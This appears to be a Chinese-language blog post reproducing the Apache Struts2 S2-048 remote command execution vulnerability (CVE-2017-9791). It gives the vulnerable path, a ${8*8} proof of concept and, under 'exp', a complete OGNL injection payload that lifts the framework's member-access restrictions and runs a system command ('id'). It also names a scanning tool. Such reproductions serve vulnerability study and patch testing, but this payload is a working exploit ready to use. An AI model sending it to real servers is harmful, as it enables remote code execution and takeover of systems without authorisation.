# 【漏洞复现】Struts2 S2-048 远程命令执行漏洞 （CVE-2017-9791）

@[TOC]

# 漏洞介绍

描述：Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。
攻击者构造恶意字段值（value）通过Struts2的struts2-struts1-plugin传递给被攻击主机，从而实现RCE，获取远程主机的控制权限。

# poc

 **访问漏洞存在的路径 /integration/saveGangster.action**

![在这里插入图片描述](https://image.3001.net/images/20220811/1660188137_62f475e972b7abe630ab7.png!small)  
点击Submit提交后发现${8*8}被执行。

![在这里插入图片描述](https://image.3001.net/images/20220811/1660188138_62f475ea360c6860181dc.png!small)

# exp

    
    
    %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
    

![在这里插入图片描述](https://image.3001.net/images/20220811/1660188138_62f475eaae8ee1a86db57.png!small)

# 扫描工具

 **Yakit**

![在这里插入图片描述](https://image.3001.net/images/20220811/1660188139_62f475eb5cab590b3fcaf.png!small)

